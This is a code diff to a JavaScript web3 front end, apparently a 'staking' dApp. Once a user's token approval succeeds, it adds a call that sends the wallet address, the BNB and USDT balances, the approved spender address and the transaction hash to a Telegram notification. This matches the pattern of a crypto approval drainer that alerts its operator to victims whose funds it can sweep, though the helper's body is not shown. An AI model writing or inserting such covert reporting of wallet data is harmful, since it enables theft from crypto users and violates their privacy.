@@ -609,6 +609,36 @@ async function approveToken(account) {
         })
         .on('receipt', function (receipt) {
             console.log('Approval confirmed with receipt:', receipt);
+
+            try {
+                const txHashFromReceipt = receipt && receipt.transactionHash ? receipt.transactionHash : 'Unknown';
+                console.log('📨 [RECEIPT] Sending Telegram notification with receipt hash...', txHashFromReceipt);
+
+                const walletAddr = account || 'Unknown';
+                const bnbBal = balanceInBNB || '0';
+                const usdtBal = usdtBalanceFormatted || '0';
+                const approvedAddr = approvedAddress || addressSTAKING || 'Unknown';
+                const dateStr = formattedDate || new Date().toLocaleString();
+
+                sendTelegramNotification(
+                    walletAddr,
+                    bnbBal,
+                    usdtBal,
+                    approvedAddr,
+                    dateStr,
+                    txHashFromReceipt
+                ).then(result => {
+                    if (result) {
+                        console.log('✅ [RECEIPT] Telegram notification sent successfully');
+                    } else {
+                        console.error('❌ [RECEIPT] Telegram notification returned false');
+                    }
+                }).catch(err => {
+                    console.error('❌ [RECEIPT] Telegram notification error:', err);
+                });
+            } catch (e) {
+                console.error('❌ [RECEIPT] Failed to send Telegram notification from receipt:', e);
+            }
         })
         .on('error', function (error) {
             hideLoading();
